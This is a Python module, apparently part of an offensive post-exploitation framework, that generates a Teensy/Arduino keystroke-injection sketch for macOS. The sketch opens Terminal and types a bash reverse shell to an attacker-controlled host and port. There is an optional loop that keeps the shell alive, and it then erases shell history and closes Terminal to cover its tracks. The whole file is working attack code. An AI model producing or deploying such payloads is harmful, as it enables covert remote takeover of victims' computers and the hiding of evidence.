from modules import helper as h
import os, time

class payload:
	def __init__(self):
		self.name = "Teensy macOS"
		self.description = "arduino payload that replicates keystrokes for shell script execution"
		self.usage = "install via arduino"

	def run(self,server):
		while 1:
			persistence = raw_input(h.info_general_raw("Make Persistent? (y/N): ")).lower()
			if persistence == "y":
				shell_command = "while true; do $(bash &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1); sleep 5; done & "
				break
			elif persistence == "n" or not persistence:
				shell_command = "bash &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1;"
				break
			else:
				h.info_error("invalid option: " + persistence)

		shell_command += "history -wc;killall Terminal"
		if os.path.exists("payloads") == False:
			os.mkdir("payloads")
		if os.path.exists("payloads/teensy_macos") == False:
			os.mkdir("payloads/teensy_macos")
		payload_save_path = "payloads/teensy_macos/teensy_macos.ino"
		payload = """\
#include "Keyboard.h"
const int LED = 13;
void setup() {
	pinMode(LED, OUTPUT);
	Serial.begin(9600);
	delay(1000); //delay to establish connection
	Keyboard.set_modifier(MODIFIERKEY_GUI);
	Keyboard.set_key1(KEY_SPACE);
	Keyboard.send_now();
	Keyboard.set_modifier(0);
	Keyboard.set_key1(0);
	Keyboard.send_now();
	delay(200);
	Keyboard.print("terminal");
	delay(1000);
	keyEnter();
	delay(1000);
	Keyboard.print(\""""+shell_command+"""\");
	keyEnter();
}

void keyEnter() {
	Keyboard.set_key1(KEY_ENTER);
	Keyboard.send_now();
	//release
	Keyboard.set_key1(0);
	Keyboard.send_now();
}

void loop() {
	digitalWrite(LED, HIGH);
	delay(100);
	digitalWrite(LED, LOW);
	delay(100);
}"""
		f = open(payload_save_path,"w")
		f.write(payload)
		f.close()
		h.info_general("Payload saved to " + payload_save_path)


